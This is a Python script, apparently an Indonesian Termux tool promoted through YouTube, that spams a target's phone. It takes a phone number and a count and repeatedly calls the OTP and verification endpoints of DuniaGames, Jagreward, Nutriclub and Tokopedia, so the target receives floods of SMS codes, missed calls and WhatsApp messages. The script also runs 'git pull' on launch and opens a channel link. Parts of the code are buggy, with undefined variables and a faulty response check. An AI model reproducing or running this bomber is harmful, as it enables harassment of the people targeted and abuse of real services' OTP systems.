# Jangan Lupa Subscribe Youtube Tutorial Termux:)
# -------{ Di sini Gw Import Module dulu }-------- #
import os,sys,time,requests,json,random,re
from requests import post
from requests import get
# -------{ Di sini gw memanggil git pull untuk otamatis ke update jika ada pembaruan }-------- #
os.system("git pull")
r = requests.Session()
dark_point = 1
# -------{ ini adalah inti dari script nya }-------- #
def mr_dark_nutric():
  darkreq = requests.post("https://www.nutriclub.co.id/otp/?phone=0"+nom+"&old_phone=0"+nom,headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'})
  if json.loads(darkreq.text)["StatusMessage"] == 'Request misscall berhasil':
       sukses("1","call","nutriclub")
       time.sleep(30)
  else:
       gagal("1","call","nutriclub")
       time.sleep(30)
def mr_dark_jag():
  dark_request = requests.get("https://id.jagreward.com/member/verify-mobile/"+drknom)
  dark_json = json.loads(dark_request.text)
  if dark_json["message"] == 'Anda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini.':
       sukses("2","call","jagreward")
       time.sleep(30)
  else:
       print (f'  [x] Tidak dapat terkirim di karenakan sudah limit! ')
       time.sleep(30)
def mr_x():
    time.sleep(1)
    os.system("clear")
    print (" SUBCRIBE CHANNEL GUE GUYSS")
    time.sleep(1)
    os.system("xdg-open https://www.youtube.com/@hkofficial9838")
    time.sleep(5)
    os.system("clear")
# -------{ bang give alok bang :V }-------- #
def mr_dark_input():
    subs_mr_dark = input("  ➤ ")
    if subs_mr_dark == "1":
         dark_point = 1
         print ("<═════════════[ • RUNNING • ]══════════════>")
         telkom_0 = input("   [#] No Target: 0")
         jumlah = int(input("   [#] Jumlah: "))
         inquiryId_telkom = "219424679"
         telkom = ("0"+telkom_0)
         dark={
         "phoneNumber":telkom,
         "inquiryId":inquiryId_telkom
         }
         print ("<════════════[ • STATUS • ]══════════════>")
         for i in range(int(jumlah)):
             darko=requests.post('https://api.duniagames.co.id/api/transaction/v1/top-up/transaction/req-otp/',headers=mr_telkom,json=dark).text
             if 'Field ini harus diisi dengan nomor Telkomsel' in darko:
                  print ('   [#] No Target Harus Menggunakan Telkomsel!  ')
                  time.sleep(2)
                  print ("<═════════════[ • STOP • ]═══════════════>")
                  break
             if 'Maaf, Anda belum melakukan konfirmasi OTP di transaksi sebelumnya, silakan coba kembali setelah 1 menit' in darko:
                  print ('   [#] Tidak dapat terkirim di karenakan inquiryId sedang di gunakan!, Mohon Coba Lagi!  ')
             else:
                  print (f'   [{dark_point}] Terkirim  ')
                  dark_point += 1
             dark_time(00, 60)
    elif subs_mr_dark == "3":
         dark_point = 1
         print ("<════════════[ • RUNNING • ]══════════════>")
         xl_0 = input("   [#] No Target: 0")
         no = ("0"+xl_0)
         jumlah = int(input("   [#] Jumlah: "))
         InquiryId_xl = "237992422"
         id_xl = "237775262"
         dark_user = {
         'User-Agent' : 'Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36',
         'Accept-Encoding' : 'gzip, deflate',
         'Connection' : 'keep-alive',
         'Origin' : 'https://accounts.tokopedia.com',
         'Accept' : 'application/json, text/javascript, */*; q=0.01',
         'X-Requested-With' : 'XMLHttpRequest',
         'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'
         }
         regist = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+no+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = dark_user).text
         drk = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', regist).group(1)
         mr_dark_to_the_moon = {
         "otp_type" : "116",
         "msisdn" : no,
         "tk" : drk,
         "email" : '',
         "original_param" : "",
         "user_id" : "",
         "signature" : "",
         "number_otp_digit" : "6"
         }
         mr_dark_bruh = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = dark_user, data = mr_dark_to_the_moon).text
         print ("<════════════[ • STATUS • ]══════════════>")
         for i in range(int(jumlah)):
             if 'Anda sudah melakukan 3 kali pengiriman kode' in mr_dark_bruh:
                  print(f'   [{dark_point}] Silahkan Coba Ulang Setelah 5 menit!  ')
                  time.sleep(5)
                  dark_point += 1
             else:
                  print(f'   [{dark_point}] Terkirim  ')
                  time.sleep(5)
                  dark_point += 1
    elif subs_mr_dark == "2":
         dark_point = 1
         print ("<════════════[ • RUNNING • ]══════════════>")
         drknom = input("   [#] No Target: 0")
         no = ("0"+drknom)
         jumlah = int(input("   [#] Jumlah: "))
         hd = {
         "accept": "text/html, application/xhtml+xml, application/json, */*",
         "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
         "content-length": "166",
         "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
         "origin": "https://h5.rupiahcepatweb.com",
         "referer": "https://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=200219190100215723",
         "sec-fetch-dest": "empty",
         "sec-fetch-mode": "cors",
         "sec-fetch-site": "same-site",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36"
         }
         dt = {"mobile":no,"noise":"1583590641573155574","request_time":"158359064157312","access_token":"11111"}
         data = json.dumps(dt)
         print ("<════════════[ • STATUS • ]══════════════>")
         for i in range(int(jumlah)):
             dark_request = requests.get("https://id.jagreward.com/member/verify-mobile/"+drknom)
             dark_json = json.loads(dark_request.text)
             if 'Anda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini.' in dark_request:
                  print (f"   [{dark_point}] Terkirim ")
                  time.sleep(30)
                  dark_point += 1
             else:
                  print (f'   [{dark_point}] Tidak dapat terkirim di karenakan sudah limit! ')
                  time.sleep(30)
                  dark_point += 1
def banner_anjay_subs_mr_dark():

    print ("   ╔═╗┌─┐┌─┐┌┬┐     ╔═╗┌─┐┬ ┬")
    print ("   ╚═╗├─┘├─┤│││ ─── ╚═╗│  │││")
    print ("   ╚═╝┴  ┴ ┴┴ ┴     ╚═╝└─┘└┴┘")
    print ("")
    print ("    > AUTHOR  : HK OFFICIAL8938 ")
    print ("    > YOUTUBE : TUTORIAL TERMUX ")
    print ("    > GITHUB  : github.com/wayle77/SpamWa ")       
    print ("")
    print ("    > Status Otp : Running")
    print ("    > Version : 1.6")
    print ("")
    print ("    1 . Spam Sms (DuniaGames) ")
    print ("    2 . Spam Call (Jagreward) ")
    print ("    3 . Spam Whatsapp (Tokopedia) ")
    print ("")
    mr_dark_input()
def dark_time(start_minute, start_second):
    total_second = start_minute * 60 + start_second
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'   [#] waiting ({secs:02d})', end='\r')
        time.sleep(1)
        total_second -= 1

mr_telkom={
'Host':'api.duniagames.co.id',
'content-length':'50',
'accept':'application/json, text/plain, */*',
'sec-ch-ua-mobile':'?0',
'save-data':'on',
'user-agent':'Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36',
'content-type':'application/json',
'origin':'https://duniagames.co.id',
'sec-fetch-site':'same-site',
'sec-fetch-mode':'cors',
'sec-fetch-dest':'empty',
'referer':'https://duniagames.co.id/',
'accept-encoding':'gzip, deflate, br',
'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
}
mr_x()
banner_anjay_subs_mr_dark()
